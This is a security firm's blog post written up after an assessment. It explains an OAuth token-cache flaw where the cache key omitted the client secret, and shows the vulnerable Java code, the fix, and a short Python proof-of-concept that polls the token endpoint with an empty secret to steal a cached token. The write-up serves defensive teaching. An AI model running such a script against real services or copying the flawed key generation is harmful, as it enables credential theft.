---
layout: single
title:  "AppSec Travels: Part 1"
date:   2023-01-13 16:29:00 -0600
categories: posts research vulnerabilities
tags: appsec edge-case vulnerability research review findings 
permalink: /AppSec-Travels-1-Function-Overload/
author: Justin Larson
author_profile: true
classes: wide
---

# <span style="color:red">Token Caching</span>

This is our first blog of AppSec Travels where we walk you through interesting findings we've discovered in vulnerability assessments. This will be on ongoing series without a regular cadence because frankly some assessments are perfunctory security checks lacking in exciting findings and we sort of doubt anyone wants to read findings write-ups on lack of _HTTPONLY_ flags. As a consequence, AppSec travels will be reserved for findings that are interesting to us and hopefully to you as well. We don't claim that these findings will be in every assessment or that they need to added to your general security checklists, but hopefully they help in thinking differently about your individual approach to security testing. We do _a lot_ of secure code reviews here at Redpoint Security so most of these blog posts will focus on code along with dynamic testing. Some names and data have been changed to protect the innocent (and our customers' NDAs).  

## Token Caching in the Wild

Recently we were tasked with testing an API, a simple, straight-forward assessment with only a handful endpoints. With such a limited scope, there wasn't much to go wrong, and we didn't find anything until the last day.[^1] There was one endpoint that we were testing `/oauth/token` that took a Client ID and Client Secret as the params to generate an access token used for authentication to the API. We were using Burp Suite's Repeater tab when we discovered that if you send a request with a valid Client ID and invalid Client Secret right after a valid request with the correct Client ID and Secret that the application would return a valid access token. 

![Attack]({{ site.baseurl }}{{ '/assets/images/appsec-travels/1/attack-1.png' }})
_Valid Request with correct credentials_

![Attack]({{ site.baseurl }}{{ '/assets/images/appsec-travels/1/attack-2.png' }})
_Request lacking `client_secret` but application still returns valid `access_token`_

This was behavior that I had never seen before, and, if you waited more than 10 seconds to send your invalid credential request, the application would respond with a failed authentication attempt. This was a hybrid assessment so we had access to the code which is always helpful in understanding what is going on under the hood. The code implemented an insecure decorator that only used the Client ID in order to access the token cache. 


```java
@RequestMapping(value = "/oauth/token", method = RequestMethod.POST)
  @ResponseStatus(HttpStatus.OK)
  public Mono<AuthTokenResponse> login(@RequestBody AuthTokenRequest authTokenRequest) {
    return Mono.just(authTokenCache.retrieveAccessToken(authTokenRequest.getClientId(), authTokenRequest.getClientSecret(), audience,
      AuthStrategy.AUTH0));
  }
```
_Request mapping for `/oauth/token` follows to `retrieveAccessToken`_

```java
  @Cacheable(value = TOKEN_CACHE, keyGenerator = "apiTokenKeyGenerator")
  public AuthTokenResponse retrieveAccessToken(String clientId, String clientSecret, String audience, AuthStrategy authStrategy) {
    log.debug("Calling auth0 api for new access token");
    //TODO Handle Errors
    return authClients.get(authStrategy).retrieveAuthToken(audience, clientId, clientSecret).getBody();
  }
}
```
The `retrieveAccessToken` function has a decorator that looks in the token cache for a valid access token for the client, the only problem is–as we see in the code below–the `generate` function only uses a system-generated `audience` plus `params[0]` which is comprised solely of the `client_id` to generate a key for the token. 

```java
public class ApiTokenKeyGenerator implements KeyGenerator {
  private final String audience;

  public ApiTokenKeyGenerator(String audience) {
    this.audience = audience;
  }

  @Override
  public Object generate(Object target, Method method, Object... params) {
    return "token-cache:" + audience + ":" + params[0];
  }
}
```
In order to demonstrate this attack we wrote a simple python script that attempted the `/oauth/token` request over and over again without a valid Client Secret. Then we logged in using Postman and the attack script would retrieve the access token, print it to the screen and stop. 

```python 
import requests
import json
import time

CLIENT_ID="<CLIENT_ID>"

def attack():
    url = "<URL>"
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36", "Accept": "*/*", "Accept-Encoding": "gzip, deflate"}
    json={"client_id": CLIENT_ID, "client_secret": ""}
    rsp=requests.post(url, headers=headers, json=json).text
    print(rsp)
    if 'access_token' in rsp:
        return True
    return False


success=False
while not success:
    success=attack()
    time.sleep(.1)
print("[!]Vulnerable to Token Theft")
```                  

![Attack]({{ site.baseurl }}{{ '/assets/images/appsec-travels/1/attack-3.png' }})

To sum up the vulnerability, the application was using a token cache with insecure key generation for accessing the token. I do have to admit that initially when we reported this vulnerability we thought it had to do with an overloaded function, there were 2 functions named `retrieveAccessToken`, one of them took 2 parameters(see below) and the other (up above) took 4. We thought the request was reaching the code below and the token was being returned with `return authTokenResponse.accessToken();` but after some more digging and seeing the code fix, we realized we were wrong about the overloaded function. Hey, we aren't perfect but we were in the right ballpark. 

```java
@Cacheable(value = TOKEN_CACHE, keyGenerator = "tokenKeyGenerator")
  public String retrieveAccessToken(String audience, AuthStrategy authStrategy) {
    log.debug("Calling auth0 api for new access token");
    //TODO Handle Errors
    AuthTokenResponse authTokenResponse = authClients.get(authStrategy).retrieveAuthToken(audience).getBody();
    if (authTokenResponse != null) {
      return authTokenResponse.accessToken();
    } else {
      log.error("Failed to get access token for audience {} and auth strategy {}", audience, authStrategy);
      return null;
    }
  }
```

The fix included using a hash of the `client_secret` as well as using the `client_id`.  

```java
 @Override
  public Object generate(Object target, Method method, Object... params) {
    String clientId = (String) params[0];
    String clientSecret = (String) params[1];
    String hashedSecret;
    try {
      MessageDigest md = MessageDigest.getInstance(hashAlgorithm);
      md.update(clientSecret.getBytes());
      hashedSecret = DatatypeConverter.printHexBinary(md.digest()).toUpperCase();
    } catch (NoSuchAlgorithmException e) {
      log.error("Unable to create cache key for {}", clientId);
      throw new RuntimeException(e);
    }
    return "token-cache:" + audience + ":" + clientId + ":" + hashedSecret;
  }
}
```

It makes sense to talk through the likelihood of a successful attack happening in this instance. An attacker would have had needed to have a valid `client_id`, in this case the `client_id` was a 32 character long string of numbers and lower and uppercase letters so guessing a `client_id` wasn't happening. There also wasn't a self registration for this application and no other endpoint leaked `client_ids` so getting a valid `client_id` would have been highly unlikely or nearly impossible. In any case, we found it an interesting edge case of unexpected application behavior.

Thanks for coming along on our first journey in AppSec Travels. Stay tuned for our next excursion into the unexpected world of Application Security and Code Review.

[^1]:Last-day findings are a thing. See Ken Kantzer's point #3 in this write-up on Secure Code Review [here](https://kenkantzer.com/learnings-from-5-years-of-tech-startup-code-audits/)